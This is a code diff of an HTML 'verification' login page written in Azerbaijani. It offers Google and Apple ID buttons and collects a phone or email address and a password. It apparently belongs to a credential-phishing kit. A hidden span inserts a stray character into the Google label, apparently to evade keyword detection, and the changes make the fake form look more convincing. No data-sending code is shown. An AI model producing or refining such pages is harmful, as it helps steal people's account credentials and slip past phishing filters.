@@ -22,7 +22,7 @@
             padding: 20px;
             border-radius: 5px;
             box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
-}
+        }
     </style>
 </head>
 <body>
@@ -34,25 +34,33 @@
             <div class="form-container">
                 <form>
                     <div class="space-y-6">
-                        <button class="flex items-center justify-center w-full py-4 bg-white text-black text-lg rounded-full">
+                        <!-- Google Verification Button -->
+                        <a href="https://example.com" class="flex items-center justify-center w-full py-4 bg-white text-black text-lg rounded-full">
                             <img src="https://upload.wikimedia.org/wikipedia/commons/0/09/IOS_Google_icon.png" alt="Google logo" class="mr-3 w-8 h-8">
                             Google ilə təsdiq ed<span style="visibility: hidden;">h</span>
-                        </button>
-                        <button class="flex items-center justify-center w-full py-4 bg-white text-black text-lg rounded-full">
+                        </a>
+
+                        <!-- Apple Verification Button -->
+                        <a href="https://apple.com" class="flex items-center justify-center w-full py-4 bg-white text-black text-lg rounded-full">
                             <i class="fab fa-apple mr-3 text-2xl text-black"></i>Apple ID ilə təsdiq ed
-                        </button>
+                        </a>
+
+                        <!-- Separator with 'yada' -->
                         <div class="flex items-center justify-center text-white text-lg">
                             <hr class="w-full border-gray-600">
                             <span class="px-3">yada</span>
-
                             <hr class="w-full border-gray-600">
                         </div>
                     </div>
+
+                    <!-- Email and Password Input Fields -->
                     <div class="form-group">
                         <input class="mail-input" type="text" id="email" name="email" required placeholder="Mobil telefon nömrəsi və ya e-poçt ünvanı">
                         <span id="emailError" style="color: red;"></span><br><br>
-                        <input class="pass-input" type="text" id="password" name="password" required placeholder="Şifrə">
+                        <input class="pass-input" type="password" id="password" name="password" required placeholder="Şifrə">
                     </div>
+
+                    <!-- Submit Button -->
                     <button id="submit-button" class="submit-button">Təsdiq Ed</button>
                 </form>
             </div>
